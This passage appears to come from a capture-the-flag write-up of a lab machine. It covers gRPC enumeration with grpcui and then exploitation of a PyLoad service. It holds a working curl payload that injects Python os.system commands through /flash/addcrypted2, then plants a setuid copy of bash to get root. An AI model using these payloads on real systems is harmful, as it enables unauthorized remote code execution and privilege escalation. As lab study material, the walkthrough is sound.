- Nmap result did not have any extra information as well which mean it is hard to move on.
- Since port 50051 opened, i have no idea and trying out a bunch of different stuff that hope it works

```bash
>> curl 10.10.11.214:50051
curl: (1) Received HTTP/0.9 when not allowed

>> nc 10.10.11.214 50051
?��?�� ?@Did not receive HTTP/2 settings before handshake timeout  
```

- The `nc` command will only give us a error message after some times.
- My next step is to search for each error message and hope for something useful.
- After searching for some times, I found a useful [information](https://github.com/grpc/grpc/issues/13062) .
- The link given let us understand that the port 50051 is related to **grpc**.
- Since its related to **grpc**, next will be understanding how it works and how to interact with it.
- After searching for a while, I managed to find a tool named [**grpcui**](https://github.com/fullstorydev/grpcui).
- After the installation of **grpcui**, I finally managed to interact with the port 50051

```bash
>> ./go/bin/grpcui -plaintext 10.10.11.214:50051
```


- Based on the source, the title name is **PyLoad**.
- Since that is the only hint i got, lets just search it online.
- After searching, I managed to found this [exploit](https://www.ctfiot.com/93323.html) and this [exploit](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/) with POC about it.
- According to the exploit, we are able to perform **RCE**.

```bash
# urlencoded text: pyimport os;os.system("whoami > /tmp/test.txt")

sau@pc:~$ curl -X POST http://localhost:8000/flash/addcrypted2 -d 'jk=pyimport%20os%3Bos.system%28%22whoami%20%3E%20%2Ftmp%2Ftest.txt%22%29;f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
Could not decrypt keysau@pc:~$ cat /tmp/test.txt
root
```

- After trying out the exploit POC, i managed to get a root user from it.
- Now the remaining part will be getting the root shell.

```bash
#urlencoded text: pyimport os;os.system("cp /bin/bash /tmp/ks;chmod +s /tmp/ks")

sau@pc:~$ curl -X POST http://localhost:8000/flash/addcrypted2 -d 'jk=pyimport%20os%3Bos.system%28%22cp%20%2Fbin%2Fbash%20%2Ftmp%2Fks%3Bchmod%20%2Bs%20%2Ftmp%2Fks%22%29;f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
```

- Since now I have a fake shell, lets just run it and get root.

```bash
sau@pc:~$ /tmp/ks -p
ks-5.0# whoami
```
